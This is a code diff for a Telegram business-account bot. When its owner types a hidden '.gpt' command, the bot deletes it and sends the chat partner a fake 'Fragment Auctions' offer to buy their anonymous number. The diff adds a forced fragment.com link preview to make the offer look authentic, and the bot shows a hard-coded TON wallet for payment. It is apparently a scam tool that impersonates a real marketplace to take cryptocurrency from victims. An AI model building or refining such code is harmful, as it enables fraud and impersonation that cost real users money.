@@ -1,6 +1,6 @@
 import asyncio
 from aiogram import Bot, Dispatcher, F
-from aiogram.types import Message, CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup
+from aiogram.types import Message, CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, LinkPreviewOptions
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
 
@@ -11,12 +11,8 @@ TON_WALLET = "UQCiU6HfycyDIneKsw-UAYakjfr4W99W558nbJKaaRPeSh6b"
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dispatcher = Dispatcher()
 
-# ID премиум-эмодзи
 CHECK_EMOJI_ID = "5774022692642492953"
 ENVELOPE_EMOJI_ID = "6019263620142078168"
-TON_EMOJI_ID = "5318901904686754959"
-
-TON_EMOJI = f'<tg-emoji emoji-id="{TON_EMOJI_ID}">💎</tg-emoji>'
 
 async def safe_delete(chat_id, message_id, conn_id=None):
     if conn_id:
@@ -30,13 +26,11 @@ async def safe_delete(chat_id, message_id, conn_id=None):
     except Exception:
         pass
 
-# --- ОБРАБОТЧИК КОМАНДЫ .gpt (ОТПРАВКА ОФФЕРА В ЧАТ) ---
 @dispatcher.business_message(F.text.startswith(".gpt"))
 async def send_offer(message: Message):
     if not message.business_connection_id:
         return
 
-    # Проверка, что команду пишешь именно ты (владелец бизнес-аккаунта)
     try:
         connection = await bot.get_business_connection(message.business_connection_id)
         owner_id = connection.user.id
@@ -50,7 +44,6 @@ async def send_offer(message: Message):
     if len(parts) < 3:
         return
 
-    # Ищем номер (начинается с +)
     phone_number = None
     for p in parts[1:]:
         if p.startswith("+"):
@@ -60,24 +53,28 @@ async def send_offer(message: Message):
     if not phone_number:
         return
 
-    # Ищем сумму
     try:
         amount = parts[2] if not parts[2].startswith("+") else parts[3]
+        if len(amount) > 6:
+            await bot.send_message(message.chat.id, "❌ Ошибка формата. Вводите так: <code>.gpt +8880367 150</code>", parse_mode="HTML")
+            return
     except IndexError:
         return
 
-    amount_text = f"{amount} {TON_EMOJI}"
+    amount_text = f"{amount} TON"
 
-    # Красиво форматируем номер
     phone_clean = phone_number.replace("+", "")
-    if len(phone_clean) >= 11:
-        formatted_phone = f"+{phone_clean[:3]} {phone_clean[3:7]} {phone_clean[7:]}"
+    if len(phone_clean) >= 10:
+        formatted_phone = f"+{phone_clean[:3]} {phone_clean[3:]}"
     else:
         formatted_phone = phone_number
 
-    # Текст оффера
+    # Ссылка на страницу номера на Fragment (для превью картинки)
+    fragment_link = f"https://fragment.com/number/{phone_clean}"
+
+    # Текст оффера (как на скрине)
     offer_text = (
-        f"<b>Fragment</b>\n"
+        f"<b>Fragment Auctions</b>\n"
         f"<b>Buy {formatted_phone}</b>\n\n"
         f"Поступило предложение о выкупе вашего анонимного номера.\n\n"
         f"Сумма: <b>{amount_text}</b>\n"
@@ -89,24 +86,27 @@ async def send_offer(message: Message):
         InlineKeyboardButton(text="Принять", callback_data="accept_offer", icon_custom_emoji_id=CHECK_EMOJI_ID)
     ]])
 
-    # Удаляем команду .gpt из чата, чтобы ее никто не видел
     await safe_delete(message.chat.id, message.message_id, message.business_connection_id)
 
-    # Отправляем оффер от имени бизнес-аккаунта прямо в этот чат
     try:
+        # Отправляем сообщение с принудительным превью
         await bot.send_message(
             chat_id=message.chat.id,
             text=offer_text,
             reply_markup=keyboard,
-            business_connection_id=message.business_connection_id
+            business_connection_id=message.business_connection_id,
+            link_preview_options=LinkPreviewOptions(
+                url=fragment_link,
+                is_disabled=False,
+                prefer_large_media=True,
+                show_above_text=True
+            )
         )
     except Exception as e:
         print(f"Ошибка отправки: {e}")
 
-# --- ОБРАБОТЧИК "ПРИНЯТЬ" ---
 @dispatcher.callback_query(F.data == "accept_offer")
 async def on_accept_offer(callback: CallbackQuery):
-    # Получаем conn_id из сообщения, на которое нажали
     conn_id = callback.message.business_connection_id
 
     new_text = (
@@ -133,7 +133,6 @@ async def on_accept_offer(callback: CallbackQuery):
         
     await callback.answer()
 
-# --- КОПИРОВАНИЕ КОШЕЛЬКА ---
 @dispatcher.callback_query(F.data == "copy_wallet")
 async def on_copy_wallet(callback: CallbackQuery):
     await callback.answer(f"Кошелек скопирован: {TON_WALLET}", show_alert=True)
